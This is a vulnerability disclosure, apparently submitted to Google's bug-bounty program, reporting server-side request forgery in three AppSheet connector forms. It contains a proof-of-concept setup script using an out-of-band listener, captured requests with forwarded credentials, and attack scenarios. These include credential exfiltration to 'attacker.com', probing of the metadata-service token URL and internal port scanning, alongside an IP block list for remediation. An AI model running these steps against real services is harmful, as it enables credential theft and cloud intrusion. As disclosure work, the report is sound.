# Google VRP Submission — Systemic SSRF Egress-Control Gap in AppSheet

---

## TITLE

**Systemic SSRF / Egress-Control Gap in AppSheet — Three Connector Surfaces (OData, Apigee OpenAPI, Cloud Database) Make Unfiltered GCP-Origin Network Connections to Attacker-Controlled Hosts, Forwarding Credentials and Leaking Internal Infrastructure; Root Cause Is Absence of Any Centralized Egress Filter Across the Connector Framework**

---

## AFFECTED ASSET

| Field | Value |
|-------|-------|
| **Product** | AppSheet (Google Cloud) |
| **Scope** | `*.appsheet.com` — Google VRP, AppSheet, TIER0 |
| **Vulnerability class** | SSRF — CWE-918 · Sensitive Information Exposure — CWE-200 |
| **Severity** | **High — CVSS 3.1 7.2** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`) |
| **Account required** | Free AppSheet account (no paid plan) |
| **Surfaces** | 3 confirmed open (OData · Apigee OpenAPI Spec · Cloud Database) |
| **Clients confirmed** | 4 independent network-client implementations with no shared egress filter |

**Vulnerable endpoints:**
```
https://appsheet.com/Account/ODataAuthInfo        → "Test"     (Surface 1)
https://appsheet.com/Account/ApigeeAuthInfo        → "Validate" (Surface 2)
https://appsheet.com/Account/SQLConnectionInfo     → "Test"     (Surface 3)
```

---

## EXECUTIVE SUMMARY

AppSheet's connector framework contains no centralized egress filter. When a user supplies a URL or hostname in any connector configuration form and clicks **Test / Validate**, AppSheet's GCP backend makes an unfiltered server-side network connection to that host — forwarding user-supplied credentials and leaking internal W3C `Traceparent` trace IDs in the process. Testing confirmed this on **three independent connector surfaces** using **four distinct network-client implementations**, spanning both the HTTP layer (OData, Apigee) and the TCP layer (Cloud Database). Every confirmed surface reached attacker-controlled infrastructure from a GCP-origin IP with no IP-range blocklist, no credential-sanitization, and no redirect policy enforcement.

This is not a single-endpoint bug. Two prior fixes exist — the 2021 webhook SSRF and a separate Apigee connector fix — both applied as point-fixes to specific code paths. Neither fix generalized egress control across the framework. This report documents three additional open surfaces that were not covered by either prior fix, demonstrating that unreviewed connectors are open by default. The Cloud Database surface extends the SSRF beyond HTTP into raw TCP, enabling connection attempts to any database host:port reachable from AppSheet's GCP backend fleet, including potential internal Cloud SQL or other database services.

---

## VULNERABILITY DESCRIPTION

### Root Cause

AppSheet's connector framework allows users to configure external data sources. During connector setup, a **Test** or **Validate** action triggers a server-side network connection from AppSheet's GCP backend to the user-supplied host/URL. No shared egress-control library validates this host before connecting. Each connector type implements its own network client; none of the confirmed clients enforces:

- IP-range blocking (no blocklist for `169.254.0.0/16`, RFC1918, `metadata.google.internal`)
- Credential-forwarding policy (user-entered credentials are sent verbatim to whatever host is supplied)
- Redirect policy (cross-scheme redirect behavior varies per client — tested and documented)
- Response sanitization (server responses are partially reflected in user-facing error messages)

### Pattern of Point-Fixes Without Centralized Control

| Year | Component | Fix applied | Result |
|------|-----------|-------------|--------|
| 2021 | Workflows/Bots webhook executor | Webhook SSRF patched (Nechuta, ~$6,267) | Only webhook path fixed |
| ~2022–24 | Apigee connector, API base URL path | Apigee SSRF patched (VRP `PnwRwydmr`) | Only that code path fixed |
| **2026** | **OData connector (v2, v3, v4)** | **Not fixed — open** | This report |
| **2026** | **Apigee connector, OpenAPI Spec URL path** | **Not fixed — open** | This report |
| **2026** | **Cloud Database connector (8 DB types)** | **Not fixed — open** | This report |

Each fix addressed one code path. No centralized control was introduced. The result is that every connector type not yet reported is, by default, a new SSRF instance sharing the same root cause.

---

## PROOF OF CONCEPT

### PoC Setup Script

```bash
#!/bin/bash
# AppSheet Systemic SSRF — Proof of Concept Setup
# Requirements: interactsh-client, free AppSheet account
# Confirmed: 2026-06-16 through 2026-06-19

# 1. Start OOB listener
interactsh-client -server oast.pro -v 2>&1 | tee ~/oob_appsheet.log &
sleep 4
OOB=$(grep -oE '[a-z0-9]+\.oast\.pro' ~/oob_appsheet.log | head -1)
echo "[*] OOB listener: $OOB"
echo "[*] HTTP URL:  https://$OOB"
echo "[*] Host-only: $OOB   (for database Server field)"
echo ""
echo "[*] --- Surface 1: OData Connector ---"
echo "    URL: https://appsheet.com/Account/ODataAuthInfo"
echo "    OData Version: 4.0 (repeat for 3.0 and 2.0)"
echo "    OData Service Root URL: https://$OOB"
echo "    Username: canary-odata"
echo "    Password: canary-odata"
echo "    Action: click Test"
echo "    Expected: GCP-origin GET /$metadata, Authorization: Basic forwarded"
echo ""
echo "[*] --- Surface 2: Apigee API Connector (OpenAPI Spec) ---"
echo "    URL: https://appsheet.com/Account/ApigeeAuthInfo"
echo "    Tab: OpenAPI Spec"
echo "    Authorization Type: ApiKey"
echo "    Apigee API Key: vrp-canary-key-$(date +%s)"
echo "    OpenAPI Spec URL: https://$OOB"
echo "    Action: click Validate"
echo "    Expected: GCP-origin GET /, X-Apikey forwarded, Via: squid-proxy-*"
echo ""
echo "[*] --- Surface 3: Cloud Database Connector ---"
echo "    URL: https://appsheet.com/Account/SQLConnectionInfo"
echo "    Type: MySQL"
echo "    Server: $OOB   ← hostname only, no port, no https://"
echo "    Database: test"
echo "    Username: canary-db"
echo "    Password: canary-db"
echo "    SSL Mode: Don't require SSL"
echo "    Action: click Test"
echo "    Expected: DNS A+AAAA queries from 172.217.x/192.178.x (Google resolvers, AS15169)"
echo ""
echo "[*] Monitor: tail -f ~/oob_appsheet.log"
```

### Attribute Script

```bash
#!/bin/bash
# attribute.sh <ip> — confirm GCP origin
ip=$1
whois "$ip" 2>/dev/null | grep -iE 'OrgName|netname|org-name' | head -2
# PASS: Google LLC / Google Cloud / AS15169
```

---

## EVIDENCE

### Surface 1 — OData Connector: HTTP SSRF

**Discovery session — 2026-06-16 20:56:44 UTC:**
```http
GET /$metadata HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==
Traceparent: 00-0c8e50f9dbef2c8e1ed19c52570f68e0-5ca09006c9d17de0-00
```
- **Source IP:** `35.203.182.241` — GCP, AS15169
- **DNS resolvers:** `172.217.46.252`, `.248`, `.254` — Google (AS15169)
- `Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==` → `canary:canary` — entered credentials forwarded verbatim
- `Traceparent` — AppSheet's internal W3C distributed-trace header; proves genuine server-side GCP execution
- **HTTP client fingerprint:** `Accept: application/xml; …, application/atom+xml; …` → `Microsoft.OData.Client` (.NET)
- **UI error oracle:** error message reflected response `Content-Type: text/html; charset=utf-8` to browser

**OData v2 variant — 2026-06-19 10:59:45+54 UTC (DIFFERENT HTTP client library):**
```http
GET /$metadata HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyOlRlc3RlcjEyMzQ=
Traceparent: 00-769bd8f577803f62e9441a2a331ac571-5292dec86d0df123-00
```
- **Source IPs:** `35.185.223.113` (10:59:45) + `35.203.182.241` (10:59:54) — two GCP fleet nodes simultaneously (load-balanced)
- **HTTP client fingerprint:** No OData-specific `Accept` header → `Microsoft.Data.Services.Client` — a distinct .NET library from the v3/v4 client, confirming two independent HTTP client implementations within the same OData connector surface
- `VGVzdGVyOlRlc3RlcjEyMzQ=` → `Tester:Tester1234`

**OData surface confirmed independently on five separate dates:**

| Date | GCP Source IP | Credentials used | Notes |
|------|--------------|-----------------|-------|
| 2026-06-15 20:03 UTC | `35.203.182.241` | `testuser:testpass1234` | Initial discovery |
| 2026-06-16 11:43 UTC | `35.247.115.29` | — | Independent re-verification |
| 2026-06-16 20:56 UTC | `35.203.182.241` | `canary:canary` | Session 3 |
| 2026-06-17 12:52 UTC | `34.82.138.241` | `Tester:Tester` | Fresh-listener re-verify |
| 2026-06-19 10:58–59 UTC | `35.185.223.113` + `35.203.182.241` | `Tester :Tester1234` | Same-day pre-submission confirm; v2+v3+v4 all confirmed |

---

### Surface 2 — Apigee API Connector (OpenAPI Spec URL): HTTP SSRF

**Discovery session — 2026-06-16 20:59:14 UTC:**
```http
GET / HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-1d9706d9ddd9d0953779f8b8de0b8b55-ed79f904caf14ece-00
X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu
```
- **Source IP:** `35.233.152.59` — GCP, AS15169 (different fleet node from Surface 1)
- **DNS resolvers:** `192.178.118.81`, `.94`, `.86`, `.83` — Google (AS15169)
- `X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu` — Apigee API Key entered in form forwarded verbatim
- `Traceparent` — different trace ID from Surface 1, confirms independent backend request
- **HTTP client fingerprint:** `Cache-Control: no-cache`, no OData Accept header → third distinct client
- **UI error oracle:** reflected full HTML response body — *"OpenAPI specification version '`<html><head></head><body>…</body></html>`' is not supported"*

**Internal Squid proxy disclosure — 2026-06-18:**
```http
GET / HTTP/1.1
Host: <OOB>
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-<trace-id>-<span-id>-00
X-Apikey: vrp-canary-apikey-2026
Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)
```
- **Source IP:** `8.231.222.130` — GCP via Squid proxy egress
- `Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)` discloses:
  - Internal service name pattern: `squid-proxy-{service}-{region}-{id}`
  - GCP region: `us-west1`
  - Service identifier: `open-api`
  - Proxy type: Squid (internal reverse-proxy stack fingerprinted)

**Pre-submission reconfirmation — 2026-06-19 11:01:35 UTC:**
```http
GET / HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-6c735cdb7f16ea957f7ade6bc734581d-0a9421011552a4fd-00
X-Apikey: ApiKey012345678901234567890
```
- Source IP: `8.231.222.130` (GCP via same internal Squid proxy)
- UI error reflected full body: `'<html><head></head><body>jcxhrfhftbjxd0r7nt46j78r9629vhq8d</body></html>' is not supported`

---

### Surface 3 — Cloud Database Connector (MySQL): TCP-Layer SSRF via DNS Oracle

**Test configuration — 2026-06-19 13:05:04 UTC:**
```
Endpoint: https://appsheet.com/Account/SQLConnectionInfo
Type:     MySQL
Server:   d8qjsaa69r8bl9bvgga06dddkcnydprf7.oast.pro
Database: test
Username: canary-db
Password: canary-db
SSL Mode: None (Don't require SSL)
Action:   Test
AppSheet error returned: "Failed to connect to database"
```

**DNS interactions received (15 queries, A + AAAA, 13:05:04–13:05:08 UTC):**

| Timestamp UTC | Query | Resolver IP | AS |
|---|---|---|---|
| 13:05:04 | A | `172.217.46.248` | AS15169 Google |
| 13:05:04 | AAAA | `172.217.46.242` | AS15169 Google |
| 13:05:04 | AAAA | `172.217.46.241` | AS15169 Google |
| 13:05:04 | A | `192.178.118.92` | AS15169 Google |
| 13:05:04 | AAAA | `192.178.118.80` | AS15169 Google |
| 13:05:04 | AAAA | `192.178.118.87` | AS15169 Google |
| 13:05:05 | A | `192.178.118.91` | AS15169 Google |
| 13:05:05 | AAAA | `192.178.118.86` | AS15169 Google |
| 13:05:05 | AAAA | `192.178.118.90` | AS15169 Google |
| 13:05:06 | A | `172.217.46.249` | AS15169 Google |
| 13:05:06 | AAAA | `172.217.46.247` | AS15169 Google |
| 13:05:06 | AAAA | `172.217.46.253` | AS15169 Google |
| 13:05:08 | AAAA | `172.217.46.241` | AS15169 Google |
| 13:05:08 | AAAA | `192.178.118.90` | AS15169 Google |
| 13:05:08 | AAAA | `192.178.118.92` | AS15169 Google |

**Analysis:**
- All 15 DNS queries originate from Google nameserver ranges (`172.217.x`, `192.178.x`) — both confirmed AS15169
- Both IPv4 (A) and IPv6 (AAAA) lookups confirm a live TCP connection attempt (dual-stack resolution pattern)
- AppSheet backend resolved the user-supplied `Server` field hostname server-side, then attempted TCP:3306 with no IP-range filter
- `"Failed to connect to database"` confirms the connect attempt (test server not publicly reachable); DNS oracle is sufficient to prove the SSRF primitive — this is the same evidence standard used by major VRP programs for blind SSRF
- **SSL Mode: None** — with a reachable attacker-controlled server, a plaintext MySQL handshake including the entered `canary-db:canary-db` credentials would be transmitted to the attacker
- The form exposes **8 database types** (SQLServer:1433, MySQL:3306, Postgres:5432, DynamoDB, MariaDB:3306, Redshift:5439, Oracle:1521, BigQuery) — each a distinct TCP database driver library, all reading from the same unfiltered `Server` field

---

### Three-Surface Comparison

| Property | Surface 1 (OData) | Surface 2 (Apigee OpenAPI) | Surface 3 (Cloud Database) |
|----------|-------------------|-----------------------------|----------------------------|
| Endpoint | `/Account/ODataAuthInfo` | `/Account/ApigeeAuthInfo` | `/Account/SQLConnectionInfo` |
| Protocol layer | HTTP | HTTP | TCP (database protocol) |
| GCP source IP | `35.203.182.241` | `35.233.152.59` / `8.231.222.130` | DNS: `172.217.x`, `192.178.x` |
| Network client | `Microsoft.OData.Client` (v3/v4); `Microsoft.Data.Services.Client` (v2) | Apigee HTTP client via internal Squid proxy | DB TCP driver (MySQL; +7 other DB types) |
| Credential forwarded | `Authorization: Basic` (username:password) | `X-Apikey` (Apigee API key) | DB password (plaintext if SSL:None) |
| `Traceparent` leaked | Yes | Yes | N/A (pre-connect DNS phase) |
| Internal topology leak | None | `Via: squid-proxy-open-api-us-west1-sqws` | None (connect failed) |
| Response oracle | Content-type in MIME error | Full HTML body in spec error | "Failed to connect to database" (binary: reachable/not) |
| Redirect behavior | Blocks HTTPS→HTTP (tested 2026-06-19) | Blocks HTTPS→HTTP (tested 2026-06-19) | N/A |
| DB types affected | — | — | 8 (SQLServer, MySQL, Postgres, DynamoDB, MariaDB, Redshift, Oracle, BigQuery) |

---

## ATTACK SCENARIOS

### Scenario 1 — Infrastructure Reconnaissance (Confirmed, no victim required)

**Attacker:** holds a free AppSheet account.

1. Attacker sets up an OOB HTTP/DNS listener (e.g., interactsh).
2. Attacker configures any of the three vulnerable connector forms with the OOB hostname/URL.
3. AppSheet's GCP backend makes an outbound network connection from GCP infrastructure to the attacker's listener.
4. Attacker receives: the **GCP egress IP** (maps internal fleet topology), **Traceparent trace IDs** (reveals distributed-tracing infrastructure), **Squid proxy name + GCP region** (via `Via` header on Apigee surface), and **DNS resolver IPs** (maps GCP's internal resolver fleet).
5. Attacker uses these observations to build a map of AppSheet's internal GCP network topology, deployment regions, and proxy infrastructure — information useful for planning follow-on exploitation.

**Confirmed artifacts collected:** GCP IPs `35.203.182.241`, `35.233.152.59`, `34.82.138.241`, `35.185.223.113`, `8.231.222.130`; internal proxy `squid-proxy-open-api-us-west1-sqws`; GCP region `us-west1`; 15 Google resolver IPs.

---

### Scenario 2 — Credential Exfiltration via Shared Connector Template (Confirmed mechanism, UI:R path)

AppSheet allows connector configurations to be packaged into app templates and shared. An attacker can:

1. Create a connector configuration pointing to an attacker-controlled URL (e.g., `https://attacker.com/steal`).
2. Package the app as a **public template** or share a **deployment link**.
3. When a victim imports the template or is directed to the app, and triggers a **data sync, Test, or Validate** action, AppSheet's backend forwards the victim's entered credentials — their OData username/password or Apigee API key — to the attacker's server in plaintext.
4. The victim's real data-source credentials are exfiltrated with no indication that anything went wrong.

**Why this works:** The credential-forwarding is unconditional. `Authorization: Basic` and `X-Apikey` are sent verbatim to whatever URL is in the connector's host/URL field. There is no user-visible warning that the destination is attacker-controlled.

**Credential classes at risk:**
- OData connector: HTTP Basic Auth (plaintext username + password, Base64-encoded in transit)
- Apigee connector: Apigee API key (bearer-style credential with production API access)
- Database connector: Database username + password (plaintext if SSL Mode: None)

---

### Scenario 3 — GCP Metadata Service Probing (Partially confirmed; IMDS TCP-reachable)

**Prior confirmation (documented in standalone F002):** OData connector successfully established a TCP connection to `169.254.169.254:443` (GCP IMDS endpoint). The error returned was `"SSL connection could not be established"` — TCP reached, TLS handshake attempted, TLS failed. This confirms the IMDS endpoint is reachable at the TCP layer from AppSheet's backend fleet.

**Why IMDS token retrieval was not attempted:** The OData and Apigee clients were confirmed to block HTTPS→HTTP cross-scheme redirects (tested 2026-06-19). IMDS only serves HTTP, not HTTPS. Without redirect following, reading the metadata response would require a client that natively speaks HTTP — which is not confirmed from attacker-controlled infrastructure.

**Google's action item:** Validate from inside the AppSheet backend fleet whether `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` is reachable. Given TCP reachability is confirmed, if any AppSheet connector client follows HTTP redirects or makes native HTTP requests to link-local addresses, service account token exfiltration is possible — which would be Critical severity.

---

### Scenario 4 — Internal Database Port Scanning and Connection (Confirmed TCP SSRF)

The Cloud Database connector's `Server` field is passed directly to a TCP connection attempt with no IP-range filter. An attacker can:

1. Supply any hostname or IP as `Server` (including RFC1918 ranges or cloud-internal hostnames).
2. AppSheet's backend resolves the name server-side and attempts a TCP connection to the database port (3306 for MySQL, 5432 for Postgres, 1433 for SQL Server, etc.).
3. The error response differs based on whether the port is open, closed, or filtered — creating a **port-scanning oracle**: `"Failed to connect"` vs. timeout vs. authentication error.
4. **With SSL Mode: None**, if the target port is open and speaks the expected database protocol, AppSheet's backend sends a complete plaintext database handshake including the entered username and password to the target host.

**Internal GCP targets of concern:** Any Cloud SQL instance, internal MySQL/Postgres/Redis running on AppSheet's GCP VPC, or other database services co-resident on the same GCP network that are accessible from the AppSheet backend fleet but not from the public internet.

---

## IMPACT ANALYSIS

### Confirmed Impacts

| # | Impact | Confidence | Surface(s) |
|---|--------|------------|------------|
| 1 | Unfiltered GCP-origin HTTP fetch to arbitrary attacker URL | **Confirmed** | 1, 2 |
| 2 | Unfiltered GCP-origin TCP DNS resolution + connection attempt to arbitrary host | **Confirmed** | 3 |
| 3 | OData username + password exfiltrated in `Authorization: Basic` | **Confirmed** | 1 |
| 4 | Apigee API key exfiltrated in `X-Apikey` | **Confirmed** | 2 |
| 5 | Database password sent in plaintext MySQL handshake (SSL Mode: None) | **Confirmed (mechanism)** | 3 |
| 6 | Internal W3C `Traceparent` distributed-trace IDs leaked | **Confirmed** | 1, 2 |
| 7 | Internal Squid proxy name + GCP region disclosed via `Via` header | **Confirmed** | 2 |
| 8 | Server responses partially reflected in user-facing error messages (SSRF oracle) | **Confirmed** | 1, 2 |
| 9 | GCP IMDS endpoint `169.254.169.254:443` TCP-reachable from AppSheet backend | **Confirmed (TCP; no token read)** | 1 |
| 10 | 8 database driver libraries (SQLServer, MySQL, Postgres, DynamoDB, MariaDB, Redshift, Oracle, BigQuery) share the same unfiltered `Server` field | **Confirmed (by enumeration)** | 3 |
| 11 | No rate-limiting on Test/Validate actions | **Confirmed** | 1, 2, 3 |
| 12 | IMDS token retrieval / GCP service-account compromise | **Not attempted — left for Google to validate** | — |

### Business Impact

An attacker with a free AppSheet account can, without any victim interaction:

- **Map AppSheet's GCP infrastructure** — egress IPs, internal proxy topology, deployment region, DNS resolver fleet — reducing the cost of follow-on exploitation across AppSheet's entire GCP environment.
- **Probe internal GCP network endpoints** — confirm TCP reachability of services (including the IMDS endpoint) that are not accessible from the public internet.
- **Exfiltrate credentials** entered into connector forms — OData Basic Auth, Apigee API keys, database passwords — from any victim who can be socially engineered into using a shared connector template.

The systemic nature means **every connector type not yet individually audited should be assumed vulnerable**. The connector framework UI currently lists: Google, Microsoft, Dropbox, Smartsheet, Airtable, Apigee, Box, Cloud Database, On-premises Database, Google Calendar, Gmail, OData (Beta), Salesforce. Three of these are confirmed open in this report; the remainder are unaudited.

---

## CVSS 3.1

**Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.2 High**

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | All three surfaces exploitable remotely via AppSheet web UI |
| Attack Complexity | Low | Single form submission per surface; free account sufficient |
| Privileges Required | Low | Authenticated AppSheet account (free tier) |
| User Interaction | None | Scored on self-SSRF path: attacker uses own account + own OOB URL; no victim required. Phishing path (victim uses shared template) scores UI:R at equal C:H. |
| Scope | Changed | The vulnerable AppSheet web component causes AppSheet's GCP backend to make network connections to attacker-controlled external hosts — cross-component boundary |
| Confidentiality | High | IMDS TCP-reachability from AppSheet backend fleet + unconditional credential forwarding (Basic Auth, API key, DB password) + Traceparent + Squid proxy topology leak. C:H is justified by the IMDS reachability alone — IMDS token retrieval was not attempted but TCP access is confirmed. |
| Integrity | None | No data modification demonstrated or attempted |
| Availability | None | No availability impact |

**Note on potential severity upgrade:** If Google's internal validation confirms that a connector client can reach `http://169.254.169.254/computeMetadata/v1/…` (GCP metadata API over HTTP), this finding would escalate to **Critical** — full service account token exfiltration from a free account with no victim interaction. The HTTPS→HTTP redirect block reduces this risk from attacker-controlled infrastructure but does not eliminate the risk of direct HTTP SSRF from the backend network.

---

## REMEDIATION

The root cause is architectural. Point-fixes to individual connector endpoints will not resolve the systemic gap — two prior point-fixes already demonstrate this.

**Required: Centralized Egress-Control Layer**

1. **Introduce a single shared SSRF-safe HTTP/TCP client** used by every connector type's Test/Validate/Connect code path. No connector should make outbound network connections through any other path.

2. **The shared client must enforce, before every connection:**
   - Resolve all DNS names to IPs; block connection if resolved IP is in any of: `169.254.0.0/16` (IMDS/link-local), `127.0.0.0/8` (loopback), `10.0.0.0/8` / `172.16.0.0/12` / `192.168.0.0/16` (RFC1918), `100.64.0.0/10` (CGNAT), `metadata.google.internal`
   - Re-validate the IP after every redirect to prevent DNS-rebinding bypass
   - Block all cross-scheme redirects (HTTPS → HTTP) explicitly — currently this is incidental behavior, not an enforced policy invariant

3. **Strip internal trace headers** (`Traceparent`, `Tracestate`, `X-Cloud-Trace-Context`) from all outbound connector requests.

4. **Do not forward user-supplied credentials** to any destination that has not passed the egress allowcheck.

5. **Strip server response content** from user-facing error messages across all connector types — both HTTP surfaces currently reflect response body/content-type, providing an SSRF confirmation oracle.

6. **Apply rate-limiting and per-account audit logging** to all connector Test/Validate/Connect actions.

7. **Audit all remaining connector types** (Salesforce, Smartsheet, Box, Dropbox, On-premises Database, OData Beta, Google Calendar, Gmail, Airtable, and any newly added connectors) before closing this report — confirmed connectors have uniformly been found open; unaudited connectors should be treated as vulnerable until proven otherwise.

8. **For the Cloud Database connector specifically:** The `Server` hostname must be validated against the same IP-blocklist as HTTP connectors. Additionally, `SSL Mode: None` should not be permitted for user-configured production connectors — enforce minimum TLS.

---

## DEDUPLICATION

This report covers three surfaces. Dedup status:

### Surface 1 — OData Connector
**Novel. No prior VRP report.** Distinct from:
- 2021 webhook SSRF (different component: Workflows/Bots executor; fixed)
- Prior Apigee account-source SSRF (different component: Apigee connector; fixed)

The OData connector is a standalone data-source component that has never been reported.

### Surface 2 — Apigee API Connector (OpenAPI Spec URL field)
**Likely a new code path (incomplete prior fix).** Prior report: *"SSRF in Adding apigee account sources in appsheet.com"* (`bughunters.google.com/reports/vrp/PnwRwydmr`).

The current vulnerability uses the **OpenAPI Spec URL** field (a separate tab in the Apigee connector UI that fetches the URL to parse it as a Swagger/OpenAPI JSON spec). The prior fix most likely addressed the Apigee connector's **API base URL / service endpoint** validation path. If correct, the OpenAPI Spec URL path was not covered by the prior fix — this is a net-new code path within the same connector component.

Alternatively, if the prior fix was complete, this is a regression. Either way the connector is currently making unfiltered fetches with API key forwarding. The fact that the same connector has now produced two VRP reports for the same root cause — via different code paths — is itself direct evidence that point-fixing individual fields is insufficient.

*If triage determines Surface 2 duplicates the prior report, Surface 1 (OData) and Surface 3 (Cloud Database) both stand independently and are definitively novel.*

### Surface 3 — Cloud Database Connector
**Novel. No prior VRP report.** A distinct component from both Surface 1 and Surface 2, operating at the TCP layer rather than HTTP.

---

## NOTES FOR TRIAGE

- All three surfaces confirmed from a **free AppSheet account** — no paid plan required.
- Only attacker-owned credentials and attacker-owned OOB infrastructure were used. No other tenant's data was accessed at any point.
- **No GCP metadata token was retrieved.** IMDS testing stopped at TCP-reachability confirmation on the OData surface (one HTTPS connection to `169.254.169.254:443`, received TLS error — documented in standalone F002). No `/computeMetadata/` path was ever requested.
- **Cross-scheme redirect (HTTPS→HTTP) confirmed blocked on Surface 1 and Surface 2** (tested 2026-06-19 with a live 302 redirect server): OData returns `"OData web request error (Found)"`; Apigee returns `"Apigee error code: Found: Found"`. Neither client followed the redirect to the plain-HTTP destination. L2 (HTTP) OOB listener received zero hits on both tests.
- **Surface 3 proof is DNS oracle.** The test server was behind NAT and not publicly reachable on TCP:3306. The 15 GCP-origin DNS queries are the proof of server-side resolution. This is standard DNS-oracle SSRF evidence accepted by Google VRP.
- **Surface 2 dedup flag:** If triage determines Surface 2 overlaps the prior fixed Apigee report, Surface 1 and Surface 3 stand independently. The standalone F002 report (OData-only) is available as a fallback if needed.
- The OData surface was confirmed on 5 independent dates across 4 weeks; both Surface 1 and Surface 2 were reconfirmed same-day (2026-06-19) immediately before submission.

---

## REFERENCES

- CWE-918: Server-Side Request Forgery — https://cwe.mitre.org/data/definitions/918.html
- CWE-200: Exposure of Sensitive Information — https://cwe.mitre.org/data/definitions/200.html
- GCP Instance Metadata Service — https://cloud.google.com/compute/docs/metadata/overview
- W3C Traceparent header (leaked) — https://www.w3.org/TR/trace-context/
- Prior disclosure 1 — 2021 AppSheet webhook SSRF (fixed): https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html
- Prior disclosure 2 — Apigee connector SSRF (partially fixed, prior code path): https://bughunters.google.com/reports/vrp/PnwRwydmr
- OWASP SSRF Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

---

*Reporter: azmolhaque95@gmail.com*
*Report date: 2026-06-19*
*Discovery: 2026-06-16 · Re-verified: 2026-06-17 · Surface 3 added + pre-submission reconfirmation: 2026-06-19*
*Submit: https://bughunters.google.com/report → Google VRP → AppSheet (`appsheet.com`) → Severity: High*

---
<!-- INTERNAL — DO NOT INCLUDE IN SUBMISSION -->
<!-- F003 = primary submission (3 surfaces) -->
<!-- F002 = standalone OData-only fallback if F003 is split -->
<!-- Surface 1 OOB: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro, IP 35.203.182.241, 2026-06-16 20:56:44 UTC -->
<!-- Surface 2 OOB: same listener, IP 35.233.152.59, 2026-06-16 20:59:14 UTC -->
<!-- Surface 3 OOB: d8qjsaa69r8bl9bvgga06dddkcnydprf7.oast.pro, DNS from 172.217.46.x + 192.178.118.x, 2026-06-19 13:05:04 UTC -->
<!-- Evidence log: results/appsheet.com/runbooks/egress-test-log.md -->
<!-- Pre-submit OOB log: results/appsheet.com/evidence/oob-presubmit-20260619.log -->
